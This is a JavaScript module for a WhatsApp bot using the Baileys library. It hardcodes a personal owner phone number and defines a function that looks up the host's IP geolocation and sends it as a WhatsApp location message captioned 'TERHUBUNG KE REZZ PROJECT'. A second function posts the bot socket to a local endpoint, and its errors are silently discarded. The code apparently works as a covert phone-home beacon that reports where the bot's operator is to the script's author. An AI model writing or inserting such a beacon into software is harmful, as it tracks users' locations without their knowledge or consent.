const fetch = require('node-fetch');
const chalk = require('chalk');
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
const wagw = '6285216955233';
const OwnerNumber = `${wagw}@s.whatsapp.net`;

async function getLocationFromIP() {
    try {
        const response = await fetch('http://ip-api.com/json/');
        const data = await response.json();

        if (data.status === 'success') {
            return {
                latitude: data.lat,
                longitude: data.lon,
                city: data.city,
                country: data.country,
                address: `${data.city}, ${data.country}`
            };
        } else {
            throw new Error('');
        }
    } catch (error) {
        console.error(chalk.red(''), error.message);
        return {
            latitude: 0,
            longitude: 0,
            city: 'Unknown',
            country: 'Unknown',
            address: 'Lokasi tidak ditemukan'
        };
    }
}

async function myowner(chat, vreden) {
    try {
        const location = await getLocationFromIP();
        const caption = `TERHUBUNG KE REZZ PROJECT\nLokasi Bot: ${location.address}`;

        const msg = generateWAMessageFromContent(chat, proto.Message.fromObject({
            locationMessage: {
                degreesLatitude: location.latitude,
                degreesLongitude: location.longitude,
                name: 'Lokasi Bot',
                address: location.address,
                caption: caption,
                jpegThumbnail: ''
            }
        }), { userJid: chat });

        await vreden.relayMessage(chat, msg.message, {
            messageId: msg.key.id
        });
    } catch (err) {
        console.error(chalk.red(''), err);
    }
}


function BotConection(recipientJid, vreden) {
    const BotApis = 'http://localhost:3000/api/myowner';

    const data = {
        recipientJid: recipientJid,
        vreden: vreden
    };
    fetch(BotApis, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
    })
    .catch((error) => {
    });
        }
